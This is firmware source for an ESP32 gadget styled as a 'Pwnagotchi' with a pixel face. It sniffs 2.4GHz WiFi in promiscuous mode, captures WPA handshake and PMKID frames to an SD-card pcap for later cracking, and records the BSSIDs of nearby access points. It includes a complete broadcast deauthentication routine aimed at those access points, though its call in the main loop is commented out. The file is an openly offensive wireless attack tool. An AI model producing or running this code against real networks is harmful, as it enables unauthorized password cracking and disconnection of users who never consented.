// ===================================================================
// bySaw Pwnagotchi — passive WPA handshake / PMKID harvester with a face.
//
// Channel-hops 2.4GHz, sniffs in promiscuous mode for EAPOL (0x888E) frames,
// counts handshake messages + PMKIDs, logs raw frames to an SD pcap
// (/pwnagotchi/pwn-*.pcap, DLT_IEEE802_11), and nudges nearby APs with a light
// broadcast-ish deauth (learned BSSIDs from beacons) to elicit handshakes.
// A little pixel face reflects the mood. SELECT exits.
// ===================================================================
#include "config.h"
#include "shared.h"
#include "Pwnagotchi.h"
#include <SD.h>
#include "esp_wifi.h"

extern TFT_eSPI tft;
extern bool feature_exit_requested;
bool featureExitButtonPressed();

namespace Pwnagotchi {

static volatile uint32_t s_eapol = 0;     // EAPOL frames seen (handshake msgs)
static volatile uint32_t s_pmkid = 0;     // EAPOL M1 frames carrying a PMKID
static volatile uint32_t s_packets = 0;   // all frames seen
static uint8_t  s_channel = 1;

// learned AP BSSIDs (from beacons) to target with deauth
static uint8_t  s_bssids[32][6];
static uint8_t  s_bssidCount = 0;

// SD pcap
static File     s_pcap;
static bool     s_pcapOpen = false;

// ---- pcap (DLT_IEEE802_11 = 105, no radiotap) ----
static void pcapWriteGlobalHeader() {
  struct __attribute__((packed)) GH {
    uint32_t magic; uint16_t vmaj, vmin; int32_t tz; uint32_t sig, snap, net;
  } gh = {0xa1b2c3d4, 2, 4, 0, 0, 65535, 105};
  s_pcap.write((uint8_t*)&gh, sizeof(gh));
}
static void pcapWriteFrame(const uint8_t* buf, uint16_t len) {
  if (!s_pcapOpen) return;
  struct __attribute__((packed)) RH { uint32_t ts, tus, incl, orig; } rh;
  uint32_t ms = millis();
  rh.ts = ms / 1000; rh.tus = (ms % 1000) * 1000; rh.incl = len; rh.orig = len;
  s_pcap.write((uint8_t*)&rh, sizeof(rh));
  s_pcap.write(buf, len);
}

static void learnBssid(const uint8_t* b) {
  for (uint8_t i = 0; i < s_bssidCount; i++)
    if (memcmp(s_bssids[i], b, 6) == 0) return;
  if (s_bssidCount < 32) { memcpy(s_bssids[s_bssidCount++], b, 6); }
}

// ---- promiscuous RX: detect EAPOL + learn beacon BSSIDs ----
static void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* fr = p->payload;
  const int len = p->rx_ctrl.sig_len;
  if (len < 24) return;
  s_packets++;

  const uint8_t ftype = (fr[0] >> 2) & 0x3;   // 0 mgmt, 1 ctrl, 2 data
  const uint8_t fsub  = (fr[0] >> 4) & 0xF;

  if (ftype == 0 && fsub == 8) {              // beacon -> learn BSSID (addr3)
    learnBssid(fr + 16);
    return;
  }
  if (ftype != 2) return;                     // only data frames carry EAPOL

  // header is 24, +2 if QoS data (subtypes 8..15)
  int hdr = 24;
  if (fsub & 0x08) hdr += 2;
  // LLC/SNAP (8 bytes): AA AA 03 00 00 00 ETHERTYPE(2)
  if (len < hdr + 8) return;
  const uint8_t* llc = fr + hdr;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
  if (!(llc[6] == 0x88 && llc[7] == 0x8E)) return;   // EAPOL ethertype

  s_eapol++;
  pcapWriteFrame(fr, len);

  // crude PMKID heuristic: EAPOL-Key (type 3) with an RSN PMKID KDE
  // (00 0F AC 04) somewhere in the key data — present in M1 from the AP.
  const uint8_t* eap = llc + 8;
  int eaplen = len - (hdr + 8);
  if (eaplen > 4 && eap[1] == 3) {            // EAPOL-Key
    for (int i = 0; i + 4 < eaplen; i++) {
      if (eap[i] == 0x00 && eap[i + 1] == 0x0F && eap[i + 2] == 0xAC && eap[i + 3] == 0x04) {
        s_pmkid++;
        break;
      }
    }
  }
}

// ---- broadcast deauth toward learned BSSIDs on the current channel ----
static void nudgeDeauth() {
  if (s_bssidCount == 0) return;
  uint8_t pkt[26] = {
      0xC0, 0x00, 0x00, 0x00,                         // deauth
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // dst broadcast
      0,0,0,0,0,0,                                    // src = bssid
      0,0,0,0,0,0,                                    // bssid
      0x00, 0x00,                                     // seq
      0x07, 0x00 };                                   // reason
  for (uint8_t i = 0; i < s_bssidCount; i++) {
    memcpy(pkt + 10, s_bssids[i], 6);
    memcpy(pkt + 16, s_bssids[i], 6);
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(1);
  }
}

// ---- pixel face ----
static void drawFace(const char* eyes, const char* mouth) {
  const int cx = tft.width() / 2;
  tft.fillRect(0, 40, tft.width(), 90, UI_BG);
  tft.setTextColor(UI_ICON, UI_BG);
  tft.setTextFont(1);
  tft.setTextSize(4);
  tft.drawCentreString(eyes, cx, 55, 1);
  tft.setTextSize(3);
  tft.drawCentreString(mouth, cx, 95, 1);
}

static void drawStats() {
  tft.setTextColor(UI_TEXT, UI_BG);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.fillRect(0, 150, tft.width(), 90, UI_BG);
  char l[40];
  snprintf(l, sizeof(l), "CH %-2d   APs %d", s_channel, s_bssidCount);
  tft.drawCentreString(l, tft.width() / 2, 160, 1);
  tft.setTextSize(2);
  tft.setTextColor(UI_ICON, UI_BG);
  snprintf(l, sizeof(l), "HS %lu", (unsigned long)s_eapol);
  tft.drawCentreString(l, tft.width() / 2, 180, 1);
  snprintf(l, sizeof(l), "PMKID %lu", (unsigned long)s_pmkid);
  tft.setTextColor(UI_OK, UI_BG);
  tft.drawCentreString(l, tft.width() / 2, 205, 1);
}

void run() {
  // Stop the boot WiFi/BLE background scanners — they periodically re-scan and
  // clobber our promiscuous mode (without this the sniffer sees 0 packets).
  pauseBackgroundRadioTasks();

  s_eapol = s_pmkid = s_packets = 0;
  s_bssidCount = 0;
  s_channel = 1;

  tft.fillScreen(UI_BG);
  tft.setTextColor(UI_ICON, UI_BG);
  tft.setTextFont(1);
  tft.setTextSize(2);
  tft.drawCentreString("pwnagotchi", tft.width() / 2, 12, 1);

  // open SD pcap
  if (SD.cardType() != CARD_NONE) {
    SD.mkdir("/pwnagotchi");
    char path[40];
    snprintf(path, sizeof(path), "/pwnagotchi/pwn-%lu.pcap", (unsigned long)(millis() / 1000));
    s_pcap = SD.open(path, FILE_WRITE);
    if (s_pcap) { s_pcapOpen = true; pcapWriteGlobalHeader(); Serial.printf("[pwn] logging %s\n", path); }
  }
  if (!s_pcapOpen) Serial.println("[pwn] no SD — capturing without logging");

  // Match the proven Packet-Monitor sniffer sequence: WiFi is already inited by the
  // boot scanner, so just drop to MODE_NULL (the mode that surfaces raw frames to the
  // promiscuous callback) then enable promiscuous. Logging the esp_err returns so a
  // failure is visible over serial.
  wifi_mode_t wm;
  esp_err_t e_mode = esp_wifi_get_mode(&wm);
  if (e_mode == ESP_ERR_WIFI_NOT_INIT) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
  }
  esp_err_t e_sm = esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&snifferCb);
  esp_err_t e_pr = esp_wifi_set_promiscuous(true);
  esp_err_t e_ch = esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  Serial.printf("[pwn] wifi: getmode=0x%x setmode=0x%x promisc=0x%x ch=0x%x\n", e_mode, e_sm, e_pr,
                e_ch);

  uint32_t lastHop = 0, lastDraw = 0, lastDeauth = 0, lastLog = 0;
  uint32_t lastEapol = 0;

  while (!feature_exit_requested && !featureExitButtonPressed()) {
    uint32_t now = millis();

    // channel hop every 1.2s across 1..13
    if (now - lastHop > 1200) {
      s_channel = (s_channel % 13) + 1;
      esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
      lastHop = now;
    }
    // Active deauth needs a TX interface (STA/AP) but raw-frame RX needs MODE_NULL;
    // doing it here would require thrashing the mode each burst. Passive harvest
    // (PMKID from AP M1 on client assoc + opportunistic handshakes) works as-is.
    // nudgeDeauth();  // TODO: mode-switch deauth assist
    (void)lastDeauth;

    // redraw ~3 Hz; face reacts to recent captures
    if (now - lastDraw > 300) {
      bool caught = (s_eapol != lastEapol);
      lastEapol = s_eapol;
      if (caught)                 drawFace("^_^", "GOT IT");
      else if (s_bssidCount == 0) drawFace("-_-", "...");
      else                        drawFace("o_o", "hunt");
      drawStats();
      lastDraw = now;
    }

    // periodic serial log (debug visibility)
    if (now - lastLog > 2000) {
      Serial.printf("[pwn] ch=%d aps=%d pkts=%lu eapol=%lu pmkid=%lu heap=%u\n", s_channel,
                    s_bssidCount, (unsigned long)s_packets, (unsigned long)s_eapol,
                    (unsigned long)s_pmkid, ESP.getFreeHeap());
      if (s_pcapOpen) s_pcap.flush();
      lastLog = now;
    }
    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  if (s_pcapOpen) { s_pcap.flush(); s_pcap.close(); s_pcapOpen = false; }
  Serial.printf("[pwn] stopped: eapol=%lu pmkid=%lu\n", (unsigned long)s_eapol,
                (unsigned long)s_pmkid);
}

} // namespace Pwnagotchi
